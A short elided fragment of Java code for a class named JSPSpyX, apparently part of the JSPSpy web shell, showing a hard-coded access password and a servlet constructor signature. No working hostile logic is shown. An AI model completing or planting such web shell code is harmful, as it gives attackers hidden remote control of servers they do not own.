...
public class JSPSpyX {

    private static final String PW = "M0rk"; //password
    ...
    public JSPSpyX(ServletContext application,HttpServletRequest request,HttpServletResponse response,JspWriter out,
